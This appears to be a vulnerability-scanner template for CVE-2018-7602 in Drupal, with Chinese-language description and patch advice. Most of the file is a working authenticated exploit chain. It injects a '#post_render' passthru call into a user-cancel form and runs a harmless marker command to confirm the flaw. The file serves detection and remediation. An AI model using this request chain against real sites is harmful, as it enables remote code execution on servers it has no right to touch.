id: CVE-2018-7602
info:
  name: Drupal - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Drupal 远程代码执行漏洞
    Drupal是一个由Dries Buytaert创立的自由开源的内容管理系统，用PHP语言写成。在业界Drupal常被视为内容管理框架，而非一般意义上的内容管理系统。

    Drupal Core 7.x、8.x的多个子系统存在远程代码执行漏洞。远程攻击者可通过发送特制数组数据利用该漏洞在目标系统上执行任意代码。
  severity: critical
  remediation: |-
    官方修复建议：
    厂商已发布漏洞修复程序，请及时关注更新：
    https://www.drupal.org/sa-core-2018-004

    临时修复建议：
    <br/>1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br/>2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    words:
    - CVE-2018-7602-POC
  extractors:
  - name: userid
    type: regex
    regex:
    - <meta about="([/a-z0-9]+)" property="foaf
    group: 1
    part: body
    internal: true
  - name: form_token
    type: regex
    regex:
    - <input type="hidden" name="form_token" value="(.*)" />
    group: 1
    part: body
    internal: true
  - name: form_build_id
    type: regex
    regex:
    - <input type="hidden" name="form_build_id" value="(.*)" />
    group: 1
    part: body
    internal: true
  raw:
  - |
    POST /?q=user%2Flogin HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    form_id=user_login&name={{username}}&pass={{password}}&op=Log+in
  - |
    GET /?q={{url_encode("{{userid}}")}}%2Fcancel HTTP/1.1
    Host: {{Hostname}}
  - |
    POST /?q={{url_encode("{{userid}}")}}%2Fcancel&destination={{url_encode("{{userid}}")}}%2Fcancel%3Fq%5B%2523post_render%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3Decho+COP-2067-8102-EVC+|+rev HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    form_id=user_cancel_confirm_form&form_token={{form_token}}&_triggering_element_name=form_id&op=Cancel+account
  - |
    POST /?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F{{form_build_id}} HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    form_build_id={{form_build_id}}
  max-redirects: 2
  cookie-reuse: true
  redirects: true
